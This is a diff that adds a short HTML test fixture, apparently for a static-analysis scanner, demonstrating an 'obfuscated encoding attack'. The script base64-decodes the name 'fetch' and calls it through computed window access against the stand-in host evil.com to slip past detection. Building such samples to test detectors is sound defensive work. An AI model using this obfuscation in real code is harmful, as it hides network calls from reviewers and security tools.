@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Obfuscated Encoding Attack</title>
+</head>
+<body>
+  <!-- Attack: Use atob() decoding to bypass static analysis -->
+  <script>
+    // This should be caught by AST analysis - computed access patterns are tracked
+    const key = atob('ZmV0Y2g='); // base64 for 'fetch'
+    window[key]('https://evil.com/data').then(r => r.json()).then(console.log);
+  </script>
+</body>
+</html>
